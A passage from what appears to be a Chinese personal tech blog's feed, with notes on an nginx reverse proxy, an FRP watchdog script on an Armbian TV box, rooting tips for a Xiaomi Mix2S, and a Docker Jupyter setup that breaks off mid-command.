href="#添加反向代理文件" class="headerlink" title="添加反向代理文件"></a>添加反向代理文件</h3><ul><li><p>先备份一下默认配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/nginx/sites-avaliable/default /etc/nginx/sites-avaliable/default.bak</span><br></pre></td></tr></table></figure></li><li><p>编辑<code>default</code>。删除所有配置并加入以下内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 10086;  # Nginx 监听本地的 10086 端口（可以改为你需要的端口）</span><br><span class="line"></span><br><span class="line">server_name 127.0.0.1;</span><br><span class="line"></span><br><span class="line"># 将根路径 `/` 的请求代理到本地 5244 端口</span><br><span class="line">location / &#123;</span><br><span class="line">proxy_pass http://127.0.0.1:5244;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line"># 不加这个上传不了文件</span><br><span class="line">client_max_body_size 20000m;</span><br><span class="line">&#125;</span><br><span class="line">location /other &#123;</span><br><span class="line">proxy_pass http://127.0.0.1:5299;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>加载配置文件并重启<code>nginx</code>服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br><span class="line"></span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure></li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><p>代理时应该路径相同。比如<code>/other/</code>，目标网站的<code>/other</code>下面应该有东西。</p></li><li><p>如果没有的话就需要加上<code>/</code>来解决。但这样也可能会导致一些资源请求失败而无法完全加载网页。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location /other/ &#123;</span><br><span class="line">    proxy_pass http://other_server/;</span><br><span class="line"># 而不是</span><br><span class="line"># proxy_pass http://other_server;</span><br><span class="line">    proxy_set_header Host $host:$server_port;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>有部分网站可以通过重定向解决资源请求问题，但也只是部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location /other/ &#123;</span><br><span class="line">    proxy_pass http://other_server/;</span><br><span class="line">    proxy_set_header Host $host:$server_port;</span><br><span class="line">    proxy_redirect / /other/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>$host:$server_port</code>必不可少，因为我们使用的是内网穿透，端口自然不能自定义。加上这个，才能在网页内跳转的时候获取正确的url。</p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://www.023niu.com/show-70-58-1.html">Nginx反向代理配置及反向代理泛目录，目录，全站方法</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;缘起&quot;&gt;&lt;a href=&quot;#缘起&quot; class=&quot;headerlink&quot; title=&quot;缘起&quot;&gt;&lt;/a&gt;缘起&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;因为宽带没有公网ip，而买一个云服务器又太过费钱。因而选择了使用内网穿透，而内网穿透我比较熟悉的厂商也就是&lt;code&gt;Sakur</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
    <category term="Nginx" scheme="http://wu1015.github.io/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>FRP的无人监管设置</title>
    <link href="http://wu1015.github.io/2024/08/12/watchdog-frp/"/>
    <id>http://wu1015.github.io/2024/08/12/watchdog-frp/</id>
    <published>2024-08-12T06:46:33.000Z</published>
    <updated>2025-05-04T02:41:29.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起初"><a href="#起初" class="headerlink" title="起初"></a>起初</h2><ul><li>本着废物利用的目的，把移动的电视盒子刷成了Armbian，然后在上面挂Alist。但我也是终究没有弄到公网IP，也就只能通过内网穿透来解决这个问题。</li></ul><h3 id="电视盒子配置"><a href="#电视盒子配置" class="headerlink" title="电视盒子配置"></a>电视盒子配置</h3><ul><li>型号：MGV2000 JZ（九州）</li><li>处理器型号：s905l-b<ul><li>不确定，因为有部分人说是s905l2，但我之前看固件应该是s905-b（没错，-b指的就是有杜比）。</li><li>但我刷armbian的时候刷的是s905l2的uboot，除了网络之外一切正常（没错，就是没网，包括有线，无线与蓝牙。我还因此买了个RJ45转USB-A来保证连接）。</li><li>然而刷入s905l或者s905lb的dtb会无法启动。</li><li>这部分有待更新（等有时间把散热片拿开看一眼）。</li></ul></li></ul><h2 id="无人监管的初步-定时重启"><a href="#无人监管的初步-定时重启" class="headerlink" title="无人监管的初步_定时重启"></a>无人监管的初步_定时重启</h2><ul><li>刚开始因为电视盒子所处环境的网络可能会周期性断开，所以我设置了每天0点自动重启。一开始还好，基本都能挂上，但越后面重启时间越久。刚开始以为是网络问题，重启一次可能不过，于是乎设置了每日两次重启。然而掉线的现象更加严重。</li><li>在一次排查中发现，电视盒子在重启之后有一定几率会重启失败，系统就卡在那，包括HDMI输出都没。</li></ul><h3 id="定时重启设置"><a href="#定时重启设置" class="headerlink" title="定时重启设置"></a>定时重启设置</h3><h4 id="创建一个新的服务"><a href="#创建一个新的服务" class="headerlink" title="创建一个新的服务"></a>创建一个新的服务</h4><ul><li><p>在<code>/etc/systemd/system/</code>目录创建一个服务，名字随便命名，这里为<code>reboot</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/reboot.service</span><br></pre></td></tr></table></figure></li><li><p>输入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Reboot Service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/sbin/reboot</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li></ul><h4 id="设置一个新的定时器"><a href="#设置一个新的定时器" class="headerlink" title="设置一个新的定时器"></a>设置一个新的定时器</h4><ul><li><p>在与刚刚创建的<code>reboot.service</code>的同级目录创建一个定时器，随便命名，这里同样为<code>reboot</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/reboot.timer</span><br></pre></td></tr></table></figure></li><li><p>输入以下内容并保存。（每天的2:30重启）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Reboot Timer</span><br><span class="line"></span><br><span class="line">[Timer]</span><br><span class="line">OnCalendar=*-*-* 02:30:00</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=timers.target</span><br></pre></td></tr></table></figure></li><li><p>启动定时器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable --now reboot.timer</span><br></pre></td></tr></table></figure></li><li><p>查看时间表，如果不出意外的话会看到一个名为<code>reboot.timer</code>的服务会在<code>02:30:00</code>执行，然后截止日期为<code>n/a</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl list-timers</span><br></pre></td></tr></table></figure></li></ul><h2 id="无人监管的进阶-看门狗"><a href="#无人监管的进阶-看门狗" class="headerlink" title="无人监管的进阶_看门狗"></a>无人监管的进阶_看门狗</h2><ul><li>因为重启可能导致的问题，我放弃了所有定时重启的选项，转而选择看门狗重启FRP服务。</li><li>用看门狗进行无人监管的原理其实很简单，就是通过定时对内网穿透出来的地址做访问，成功就不管，失败就调用FRP自带的重启。</li></ul><h3 id="看门狗设置"><a href="#看门狗设置" class="headerlink" title="看门狗设置"></a>看门狗设置</h3><h4 id="安装看门狗和netcat"><a href="#安装看门狗和netcat" class="headerlink" title="安装看门狗和netcat"></a>安装看门狗和netcat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install watchdog netcat-openbsd</span><br></pre></td></tr></table></figure><h4 id="编辑检测FRP状态的脚本"><a href="#编辑检测FRP状态的脚本" class="headerlink" title="编辑检测FRP状态的脚本"></a>编辑检测FRP状态的脚本</h4><ul><li><p>在<code>/usr/local/bin</code>目录下创建一个名为<code>check_frp.sh</code>的文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/bin/check_frp.sh</span><br></pre></td></tr></table></figure></li><li><p>写入以下内容并保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># FRP服务器的域名与端口号</span><br><span class="line">FRP_SERVER=&quot;your.frp.server&quot;</span><br><span class="line">FRP_PORT=&quot;7000&quot;</span><br><span class="line"></span><br><span class="line"># 写入的日志文件路径</span><br><span class="line">LOG_FILE=&quot;/var/log/frp_watchdog.log&quot;</span><br><span class="line"></span><br><span class="line"># 清理日志文件，保留最近3天的日志</span><br><span class="line">find $(dirname &quot;$LOG_FILE&quot;) -name &quot;$(basename &quot;$LOG_FILE&quot;)&quot; -type f -mtime +3 -exec rm &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 记录脚本运行的时间</span><br><span class="line">echo &quot;$(date): Running FRP watchdog script.&quot; &gt;&gt; $LOG_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 检查FRP的连接</span><br><span class="line">if ! nc -zv $FRP_SERVER $FRP_PORT 2&gt;&amp;1 | grep -q &#x27;succeeded&#x27;; then</span><br><span class="line">    echo &quot;$(date): FRP cannot connect to $FRP_SERVER:$FRP_PORT&quot; &gt;&gt; $LOG_FILE</span><br><span class="line">    # 重启FRP服务，注意修改配置文件路径</span><br><span class="line">    pkill frpc</span><br><span class="line">    /usr/local/bin/frpc -c /usr/local/bin/frpc.ini</span><br><span class="line">    echo &quot;$(date): FRP service restarted.&quot; &gt;&gt; $LOG_FILE</span><br><span class="line">    # exit 1  # 返回非零值以通知watchdog</span><br><span class="line">else</span><br><span class="line">    echo &quot;$(date): FRP is running and connected to the server.&quot; &gt;&gt; $LOG_FILE</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li></ul><h4 id="赋予脚本执行权限"><a href="#赋予脚本执行权限" class="headerlink" title="赋予脚本执行权限"></a>赋予脚本执行权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/check_frp.sh</span><br></pre></td></tr></table></figure><h4 id="配置看门狗调用脚本"><a href="#配置看门狗调用脚本" class="headerlink" title="配置看门狗调用脚本"></a>配置看门狗调用脚本</h4><ul><li><p>编辑看门狗的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/watchdog.conf</span><br></pre></td></tr></table></figure></li><li><p>输入以下内容（文件本身有内容不用管，直接在最上面写入就是了。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Enable the watchdog daemon</span><br><span class="line">watchdog-device = /dev/watchdog</span><br><span class="line"></span><br><span class="line"># Interval between checks in seconds</span><br><span class="line">interval = 10</span><br><span class="line"></span><br><span class="line"># Max load average before watchdog triggers</span><br><span class="line">max-load-1 = 24</span><br><span class="line"></span><br><span class="line"># Watchdog will reboot system if load average remains high for this many seconds</span><br><span class="line">watchdog-timeout = 30</span><br><span class="line"></span><br><span class="line"># Run the custom script to check FRP status</span><br><span class="line">test-binary = /usr/local/bin/check_frp.sh</span><br><span class="line"></span><br><span class="line"># Exit watchdog if the test-binary returns 1, to trigger restart attempts</span><br><span class="line"># test-binary-exit-1 = yes</span><br></pre></td></tr></table></figure></li><li><p>启动看门狗并给予自启权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start watchdog</span><br><span class="line"></span><br><span class="line">sudo systemctl enable watchdog</span><br></pre></td></tr></table></figure></li><li><p>查看看门狗状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status watchdog</span><br></pre></td></tr></table></figure></li><li><p>不出意外的话，如果断开FRP连接就会在指定目录生成日志文件。然后重启FRP服务。</p></li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul><li>在当时测试的时候没问题，但长时间的使用之后发现<code>pkill frp</code>并不能停止frp服务。又考虑到已经使用systemd设置了开机自启，故而决定使用<code>systemctl restart frpc@xxx</code>代替<code>pkill frp</code>和<code>/usr/local/bin/frpc -c /usr/local/bin/frpc.ini</code>。</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://cloud.tencent.com/developer/article/2227856">Linux设置定时重启</a></li><li>ChatGPT</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起初&quot;&gt;&lt;a href=&quot;#起初&quot; class=&quot;headerlink&quot; title=&quot;起初&quot;&gt;&lt;/a&gt;起初&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本着废物利用的目的，把移动的电视盒子刷成了Armbian，然后在上面挂Alist。但我也是终究没有弄到公网IP，也就只能通过内网</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>MOMO提示分区挂载异常问题解决以及Mix2s的类原生优化</title>
    <link href="http://wu1015.github.io/2024/08/09/mix2s-flash-root/"/>
    <id>http://wu1015.github.io/2024/08/09/mix2s-flash-root/</id>
    <published>2024-08-09T00:36:13.000Z</published>
    <updated>2024-12-23T02:24:16.439Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前提说明"><a href="#前提说明" class="headerlink" title="前提说明"></a>前提说明</h2><ul><li>使用的是机器是MIX2S</li><li>面具：官方面具，版本为27.0</li><li>shamiko版本：1.1</li><li>momo版本：4.4.2</li><li>内核：sakura 2.5（4.9.332）</li></ul><h2 id="分区挂载异常"><a href="#分区挂载异常" class="headerlink" title="分区挂载异常"></a>分区挂载异常</h2><ul><li>经过测试发现在刷入面具、LSP框架和shamiko之后momo出现分区挂载异常的回报。</li><li><ul><li>在删除LSP后回报消失。</li></ul></li><li><ul><li>在删除shamiko之后回报消失。</li></ul></li><li><ul><li>在刷入内核前无<code>分区挂载异常回报</code>。</li></ul></li><li>结论：shamiko、LSP、第三方内核只能同时存在两个，出现第三个必定回报<code>分区挂载异常</code>。</li><li>解决：删掉一个，或者是放着不管，毕竟不太影响。经过测试，在momo回报<code>分区挂载异常</code>、<code>设备运行在非官方系统</code>、<code>发现代码注入</code>、<code>调试环境</code>、<code>BL已解锁</code>后仍然可以过钉钉（版本为7.5.1）打卡。（<code>发现代码注入</code>还没解决，这个是在我刷入XP模块后出现的）（在卸载掉LSP和模块后没有好转，可能需要重刷系统。这样一来又麻烦了许多，过momo与我大抵是无缘了吧）。</li></ul><h2 id="刷机常识"><a href="#刷机常识" class="headerlink" title="刷机常识"></a>刷机常识</h2><h3 id="刷机千万条，备份第一条"><a href="#刷机千万条，备份第一条" class="headerlink" title="刷机千万条，备份第一条"></a>刷机千万条，备份第一条</h3><ul><li>解锁BL请第一时间进行基带备份，以免被恶意格机。而且备份之后如果出现TEE损坏或者传感器失效也可以进行修复。备份教程见<a href="https://www.coolapk.com/feed/55599364">字库备份_CoolApk</a>。</li></ul><h3 id="第三方Rec的选取："><a href="#第三方Rec的选取：" class="headerlink" title="第三方Rec的选取："></a>第三方Rec的选取：</h3><ul><li>与系统对应：比如安卓11要刷入适配安卓11的Rec，否则可能会出现无法自动解锁data分区甚至直接就无法解锁的现象。（目前已知的TWRP表现为需要输入密码进行解锁，但输入啥都会提示解锁失败）</li><li>中文的适配：比如TWRP有很多第三方作者进行汉化，OrangeFox官方支持中文。</li></ul><h3 id="Rec的操作"><a href="#Rec的操作" class="headerlink" title="Rec的操作"></a>Rec的操作</h3><ul><li>双清：一般指清除cache和data分区。</li><li>四清：一般指清除cache、data、system、storage分区。</li><li>更新Rec就直接在Rec刷入目标Rec的卡刷包就行了。</li></ul><h3 id="刷入第三方内核"><a href="#刷入第三方内核" class="headerlink" title="刷入第三方内核"></a>刷入第三方内核</h3><ul><li>请在刷入前备份boot分区（如果可以的话data分区也备份一份）。</li><li>请在刷入前检查data分区是否解锁，如果在没解锁的情况下刷入基本就会卡第二屏。那么就只能双清解决了（data分区数据也就没了，不过内部存储的数据一般会在）。</li><li>刷入内核之后清除cache分区。</li></ul><h3 id="sui的使用"><a href="#sui的使用" class="headerlink" title="sui的使用"></a>sui的使用</h3><ul><li>sui是一个新的方案，比直接用面具进行root的授权更加的隐秘和安全，也更加高效，但基本没啥适配的应用，建议不要使用。</li></ul><h3 id="Thanxo（灭霸）"><a href="#Thanxo（灭霸）" class="headerlink" title="Thanxo（灭霸）"></a>Thanxo（灭霸）</h3><ul><li>新版本灭霸算是黒域与app-ops的结合，不过因为需要付费，而黒域有社区版，权限狗（app-ops的替代）是免费的，还是建议直接使用这两进行替代。</li><li>不过黒域不清楚咋回事，每次启动都会弄上<code>开发者设置</code>，实际去设置看的时候又没有，但momo还是检测出来了。只能去开启之后再关上才能解决momo提示的问题。</li></ul><h3 id="MiPush"><a href="#MiPush" class="headerlink" title="MiPush"></a>MiPush</h3><ul><li>小米机型非MIUI：<ul><li>在root的前提下下载mipush framework、mipush、mipush enhance。</li><li>刷入小米机型伪装的magisk模块。</li><li>如果有应用没有注册的话可以多试几次，一般在打开后就会注册，不行就清除应用数据。</li><li>个人测试好像只要mipush framework就行了（甚至都不需要机型伪装模块），也能直接推送，就是推送那不仅会有应用名称，也会有mipush framework的字样。（在注册了之后才测试的）</li><li>个人测试需要注意应用隐藏别把mipush framework隐藏了，不然直接没办法注册。</li></ul></li></ul><h3 id="Gcam"><a href="#Gcam" class="headerlink" title="Gcam"></a>Gcam</h3><ul><li>直接打开Gcam无法打开，出现闪退现象。</li><li>搜索microg gcam，进入对的github仓库然后下载安装就可以打开了。</li></ul><h3 id="更换Magisk卡第一屏无限重启"><a href="#更换Magisk卡第一屏无限重启" class="headerlink" title="更换Magisk卡第一屏无限重启"></a>更换Magisk卡第一屏无限重启</h3><ul><li>刷入原厂或者镜像的boot到boot分区。也就是恢复boot分区，因为Magisk修补的就是boot的镜像。</li><li>切换的时候注意要删除所有模块</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><del>参考的文章太多，我也不记得有哪些了。</del></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前提说明&quot;&gt;&lt;a href=&quot;#前提说明&quot; class=&quot;headerlink&quot; title=&quot;前提说明&quot;&gt;&lt;/a&gt;前提说明&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;使用的是机器是MIX2S&lt;/li&gt;
&lt;li&gt;面具：官方面具，版本为27.0&lt;/li&gt;
&lt;li&gt;shamiko版本</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="刷机" scheme="http://wu1015.github.io/tags/%E5%88%B7%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Docker配置Jupyter</title>
    <link href="http://wu1015.github.io/2024/08/02/docker-with-jupyter/"/>
    <id>http://wu1015.github.io/2024/08/02/docker-with-jupyter/</id>
    <published>2024-08-02T07:52:03.000Z</published>
    <updated>2024-12-23T02:22:25.255Z</updated>
    
    <content type="html"><![CDATA[<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><ul><li><p>直接拉取镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure></li><li><p>或者是从本地导入镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load --input 路径/文件名.tar</span><br></pre></td></tr></table></figure></li></ul><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><ul><li><p>注意要设置好端口，不然后面设置会很麻烦。要设置GPU的话也是一样，后面再弄会很麻烦。要么弄成个镜像再启动一遍，要么停止<code>docker</code>然后修改文件，具体应该可以度娘，这里就不再赘述。<code>IMAGE ID</code>可执行<code>docker images</code>得到，也就是镜像的<code>ID</code>。包括shm的配置也是，如果没有修改配置文件的话，默认为64M，这显然是不够用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run --name 自己想要的名字 -it -p 本地端口:容器端口 IMAGE ID</span><br><span class="line"></span><br><span class="line">// 也可以不指定本地端口，让系统选一个空闲的端口</span><br><span class="line">docker run --name 自己想要的名字 -it -p 容器端口 IMAGE ID</span><br><span class="line"></span><br><span class="line">// 设置全部GPU</span><br><span class="line">docker run --gpus all --name 自己想要的名字 -it -p 容器端口 IMAGE ID</span><br><span class="line"></span><br><span class="line">// 设置使用主机的东西</span><br><span class="line">docker run --gpus all  --ipc=host --name wu1015 -it -p  本机端口:容器端口  ID </span><br></pre></td></tr></table></figure></li><li><p>启动容器后可以执行以下命令查看开放映射的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure></li></ul><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><h3 id="配置Python"><a href="#配置Python" class="headerlink" title="配置Python"></a>配置Python</h3><ul><li><p>在换源后直接执行安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install python3</span><br></pre></td></tr></table></figure></li><li><p>如果没有<code>pip</code>的话也可以这样安装，但请注意不要直接安装<code>pip</code>，而是应该安装<code>python3-pip</code>。否则在安装后执行<code>pip install</code>下载任务时会回报环境问题。</p></li><li><p>环境问题基本没有太好的解决方法，要么忽视，要么使用虚拟环境，要么使用<code>pipx</code>。虚拟环境的方法有些麻烦，请自行查阅<a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">参考文章</a>。一般认为，忽视都不算是什么好方法，毕竟后面可能会出现相应的环境冲突。所以基本都会使用<code>pipx</code>。但这肯定是不如原来的<code>pip</code>，所以还是选择删掉重下比较好。（可以通过<code>apt</code>来安装部分包，但因为大部分都不行，所以不进行考虑）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 忽视_方法一</span><br><span class="line">pip install package --break-system-packages</span><br><span class="line"></span><br><span class="line">// 忽视_方法二，请改为你的路径</span><br><span class="line">sudo mv /usr/lib/python3.12/EXTERNALLY-MANAGED /usr/lib/python3.12/EXTERNALLY-MANAGED.old</span><br><span class="line"></span><br><span class="line">// 使用pipx</span><br><span class="line">apt install pipx</span><br><span class="line"></span><br><span class="line">pipx install package</span><br></pre></td></tr></table></figure></li><li><p>当然你也可以选择删掉重下解决。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 删除之前安装的，删掉后再执行下pip和python3看看还在不在</span><br><span class="line">apt remove python3</span><br><span class="line">apt remove pip</span><br><span class="line">apt autoremove</span><br><span class="line"></span><br><span class="line">// 安装</span><br><span class="line">apt install python3</span><br><span class="line">apt install python3-pip</span><br></pre></td></tr></table></figure></li></ul><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><ul><li><p>还是建议使用python的环境也就是venv。毕竟PEP 668规定了不允许直接用系统的python混用apt和pip安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv .venv</span><br><span class="line">source .venv/bin/activate</span><br></pre></td></tr></table></figure></li><li><p>这个会创建一个小的虚拟环境。</p></li></ul><h3 id="配置其他基本环境"><a href="#配置其他基本环境" class="headerlink" title="配置其他基本环境"></a>配置其他基本环境</h3><ul><li><p>安装vim，git，curl，wget，7z，screen</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install vim git curl wget p7zip-full screen</span><br></pre></td></tr></table></figure></li><li><p>复制文件，那个id其实也能用名称，也就是创建容器时定义（或者后面改了的）的名称。<del>（其实都打算配置jupyter了，为啥不先配那个然后直接浏览器上传文件呢）</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 本地文件路径 CONTAINER ID:容器文件路径</span><br></pre></td></tr></table></figure></li></ul><h3 id="配置jupyter"><a href="#配置jupyter" class="headerlink" title="配置jupyter"></a>配置jupyter</h3><ul><li><p>安装配置jupyter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install jupyter</span><br></pre></td></tr></table></figure></li><li><p>生成默认配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure></li><li><p>修改配置文件。因为生成的配置文件基本都是注释，完全可以直接添加。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim 